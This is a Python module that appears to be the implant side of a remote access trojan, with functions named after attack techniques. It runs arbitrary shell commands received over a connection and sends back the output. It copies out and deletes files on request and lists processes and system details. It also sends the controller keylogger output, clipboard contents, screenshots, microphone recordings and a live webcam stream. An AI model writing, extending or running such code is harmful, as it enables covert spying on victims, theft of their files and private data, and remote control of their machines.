import os
import struct
import pickle
import wave
import pyperclip
import pyautogui
import pyaudio
import cv2
from .connectionModule import (send_file, read_string_from_connection, 
                               send_string_into_connection)


def gather_system_info(connection, operation_system):
    if operation_system == "Windows":
        os.system("systeminfo > file.txt")
        send_file(connection, "file.txt")
    else:
        os.system("lscpu > file.txt")
        send_file(connection, "file.txt")
    os.remove("file.txt")

def command_line_interface(connection):
    cmd = read_string_from_connection(connection)
    os.system(cmd + " > file.txt")
    send_file(connection, "file.txt")
    os.remove("file.txt")

def file_directory_discovery(connection, operation_system):
    if operation_system == "Windows":
        os.system("dir > file.txt")
    else:
        os.system("ls -l > file.txt")
    send_file(connection, "file.txt")
    os.remove("file.txt")

def remote_file_copy(connection):  
    filename = read_string_from_connection(connection)
    send_file(connection, filename)

def file_deletion(connection):
    filename = read_string_from_connection(connection)
    os.remove(filename)

def process_discovery(connection, operation_system):
    if operation_system == "Windows":
        os.system("tasklist > file.txt")
    else:
        os.system("ps aux > file.txt")
    send_file(connection, "file.txt")
    os.remove("file.txt")

def input_capture(connection):
    send_file(connection, "keys.txt")

def clipboard_data(connection):
    clboard = pyperclip.paste()
    send_string_into_connection(connection, clboard)

def screen_capture(connection):
    pyautogui.screenshot("screenshot.png")
    send_file(connection, "screenshot.png")
    os.remove("screenshot.png")

def audio_capture(connection):
    seconds = read_string_from_connection(connection)
    seconds = int(seconds)
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = seconds
    WAVE_OUTPUT_FILENAME = "output.wav"

    p = pyaudio.PyAudio()

    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    frames = []
    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    send_file(connection, "output.wav")

def video_capture(connection):
    cap = cv2.VideoCapture(0)
    while True:
        do = connection.recv(10)
        if do == b"continue":
            ret, frame = cap.read()
            data = pickle.dumps(frame)
            message_size = struct.pack("L", len(data))
            connection.sendall(message_size + data)
        elif do == b"stop":
            break
    cap.release()
